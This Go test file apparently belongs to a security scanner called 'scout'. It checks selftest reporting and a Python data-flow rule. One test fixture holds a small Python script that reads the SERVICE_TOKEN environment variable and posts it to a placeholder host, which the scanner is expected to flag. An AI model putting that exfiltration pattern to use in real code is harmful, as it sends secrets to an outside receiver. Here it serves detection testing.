package nativecheck_test

import (
	"context"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/nativecheck"
	"github.com/skarm/scout/internal/signatures"
	"github.com/skarm/scout/internal/syntax/frontend"
	"github.com/skarm/scout/internal/syntax/parse"
	"github.com/skarm/scout/report"
)

func TestCancellationRetainsEntireSelftestPlan(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	for _, ctx := range []context.Context{ctx, nil} {
		r := nativecheck.Run(ctx)
		if r.Passed || len(r.Checks) != len(nativecheck.IDs()) {
			t.Fatal(r)
		}
		for _, c := range r.Checks {
			if c.Status != "cancelled" {
				t.Fatal(c)
			}
		}
	}
}

func TestPythonProjectionThroughPublicScanner(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("Python parser not linked")
	}
	options := scout.DefaultOptions()
	options.Profile = scout.Custom
	options.Checks = &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	text := "import os\nimport requests\ntoken = os.getenv('SERVICE_TOKEN')\nrequests.post('https://receiver.invalid', data=token)\n"
	run, err := scanner.Scan(context.Background(), scout.Reader("sentinel.py", strings.NewReader(text)))
	if len(run.Targets) != 1 {
		t.Fatalf("unexpected target count: %d; error: %v", len(run.Targets), err)
	}
	analysis := run.Targets[0].Analysis
	if err != nil || run.State != report.RunComplete {
		t.Fatalf("selected Python plan unfinished: error=%v state=%s", err, run.State)
	}
	completed := false
	for _, check := range analysis.Coverage.Checks {
		if check.AnalyzerID == "PY-TT3" {
			completed = check.Status == "completed"
		}
	}
	if !completed {
		t.Fatal("Python flow projection did not complete")
	}
	for _, finding := range analysis.Findings {
		if finding.RuleID == "PY-TT3" {
			return
		}
	}
	t.Fatalf("Python flow finding missing: %+v", analysis.Findings)
}

func TestSelftestUsesCompiledCapabilities(t *testing.T) {
	// In reduced builds this proves refusal; a full build MUST execute and pass
	// every real native test. There is no skip branch or test provider here.
	r := nativecheck.Run(context.Background())
	full := frontend.BackendFor("python").Available && frontend.BackendFor("yaml").Available && frontend.BackendFor("toml").Available && signatures.Backend().Available
	if r.Passed != full {
		t.Fatalf("native selftest mismatch: %+v", r)
	}
	if len(r.Checks) != len(nativecheck.IDs()) {
		t.Fatal(r)
	}
	for i, c := range r.Checks {
		if c.ID != nativecheck.IDs()[i] {
			t.Fatalf("selftest plan order changed: %+v", r.Checks)
		}
		available := false
		for _, b := range parse.Capabilities() {
			if b.Format == c.Backend {
				available = b.Available
			}
		}
		if c.Backend == "yara-x" {
			available = signatures.Backend().Available
		}
		if available && (c.Status != "passed" || c.Reason != "") {
			t.Fatalf("available engine failed its probe: %+v", c)
		}
		if !available && (c.Status != "unavailable" || c.Reason != "engine_not_linked") {
			t.Fatalf("absent engine was not reported: %+v", c)
		}
	}
}
